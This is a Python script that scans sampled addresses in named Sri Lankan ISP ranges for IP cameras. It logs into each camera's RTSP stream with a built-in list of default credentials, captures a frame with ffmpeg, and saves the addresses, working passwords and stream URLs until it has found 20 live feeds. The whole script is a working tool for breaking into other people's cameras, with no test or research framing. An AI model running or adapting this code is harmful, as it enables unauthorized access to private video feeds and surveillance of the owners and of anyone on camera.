#!/usr/bin/env python3
"""
Direct probe for 20 live cameras - skip masscan, probe known ranges
"""
import subprocess, os, json, sys, time, shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import ipaddress

CREDS = [
    ('admin', '12345'), ('admin', ''), ('admin', 'admin'), ('admin', '1234'),
    ('admin', '123456'), ('admin', '1111'), ('admin', '888888'), ('admin', '666666'),
    ('root', ''), ('root', 'pass'), ('root', '1234'), ('root', 'root'),
    ('root', 'vizxv'), ('root', 'xc3511'), ('supervisor', 'supervisor'),
    ('ubnt', 'ubnt'), ('admin', 'password'), ('admin', 'admin123'),
]

RTSP_PATHS = [
    '/Streaming/Channels/101',
    '/Streaming/Channels/1', 
    '/h264/ch1/main/av_stream',
    '/cam/realmonitor?channel=1&subtype=0',
    '/stream1',
    '/live/ch00_0',
    '/onvif1',
]

WORK_DIR = os.path.dirname(os.path.abspath(__file__))
FRAME_DIR = os.path.join(WORK_DIR, 'hunt_frames')
os.makedirs(FRAME_DIR, exist_ok=True)

def generate_target_ips():
    """Generate likely camera IPs from Sri Lanka ranges"""
    targets = []
    
    # Sri Lanka ISP ranges - sample likely camera subnets
    ranges = [
        '112.134.0.0/16',     # SLT
        '124.43.0.0/16',      # Dialog  
        '175.157.0.0/16',     # Dialog 4G
        '220.247.0.0/17',     # SLT broadband
        '192.248.0.0/16',     # LERN
        '103.0.0.0/16',       # Various
        '116.206.0.0/16',     # Hutchison
        '180.232.0.0/16',     # Dialog/SLT
        '110.12.0.0/16',      # LK mobile
    ]
    
    for cidr in ranges:
        try:
            network = ipaddress.ip_network(cidr)
            # Sample every 1000th IP to get reasonable coverage
            for i, ip in enumerate(network.hosts()):
                if i % 1000 == 0 and len(targets) < 500:  # Limit to 500 targets
                    targets.append(str(ip))
        except:
            continue
    
    return targets

def probe_rtsp_fast(ip):
    """Fast RTSP probe - reduced attempts"""
    # Try only top 3 creds and top 3 paths for speed
    top_creds = [('admin', ''), ('admin', '12345'), ('admin', 'admin')]
    top_paths = ['/Streaming/Channels/101', '/Streaming/Channels/1', '/h264/ch1/main/av_stream']
    
    for user, passwd in top_creds:
        for rpath in top_paths:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = os.path.join(FRAME_DIR, f'frame_{ip.replace(".", "_")}.jpg')
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=2, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    return {
                        'ip': ip, 'user': user, 'password': passwd,
                        'rtsp_url': rtsp_url, 'rtsp_path': rpath,
                        'frame_file': frame, 'frame_size': os.path.getsize(frame),
                    }
            except (subprocess.TimeoutExpired, Exception):
                pass
            try:
                if os.path.exists(frame) and os.path.getsize(frame) <= 1000:
                    os.remove(frame)
            except:
                pass
    return None

def main():
    print(f'{"="*60}', flush=True)
    print(f'DIRECT PROBE: 20 SRI LANKA CAMERAS', flush=True)
    print(f'{"="*60}', flush=True)
    
    # Generate targets
    targets = generate_target_ips()
    print(f'  [DIRECT] Generated {len(targets)} target IPs', flush=True)
    
    if not targets:
        print('[!] No targets generated. Exiting.', flush=True)
        return
    
    print(f'\n  >>> PROBING FOR 20 LIVE STREAMS <<<\n', flush=True)
    
    # Phase 2: RTSP probe
    streams = []
    done = 0
    t0 = time.time()
    
    with ThreadPoolExecutor(max_workers=100) as pool:
        futures = {pool.submit(probe_rtsp_fast, ip): ip for ip in targets}
        for fut in as_completed(futures):
            done += 1
            try:
                r = fut.result()
                if r:
                    streams.append(r)
                    el = time.time() - t0
                    print(f'  [{done}/{len(targets)}] *** STREAM #{len(streams)}: {r["ip"]} | {r["user"]}:{r["password"]} | {r["frame_size"]:,}B | {el:.0f}s', flush=True)
                    
                    # Stop when we find 20
                    if len(streams) >= 20:
                        break
            except Exception:
                pass
            
            if done % 50 == 0:
                el = time.time() - t0
                rate = done / max(el, 1)
                print(f'  [{done}/{len(targets)}] {el:.0f}s | {len(streams)} streams | {rate:.1f} IPs/s', flush=True)
    
    el = time.time() - t0
    print(f'\n  [DIRECT] FOUND {len(streams)} STREAMS in {el:.0f}s', flush=True)
    
    if streams:
        print(f'\n=== FOUND {len(streams)} LIVE CAMERAS ===', flush=True)
        for i, s in enumerate(streams, 1):
            print(f'  {i:>2}. {s["ip"]:>16} | {s["user"]}:{s["password"]} | {s["frame_size"]:,}B', flush=True)
            print(f'      RTSP: {s["rtsp_url"]}', flush=True)
        
        # Save results
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = os.path.join(WORK_DIR, f'direct_20cams_{ts}.json')
        with open(out_file, 'w') as f:
            json.dump({
                'scan_time': ts,
                'targets_probed': done,
                'streams_found': len(streams),
                'streams': streams
            }, f, indent=2, default=str)
        print(f'\n[+] Results saved: {out_file}', flush=True)
    else:
        print('[!] No streams found.', flush=True)

if __name__ == '__main__':
    main()
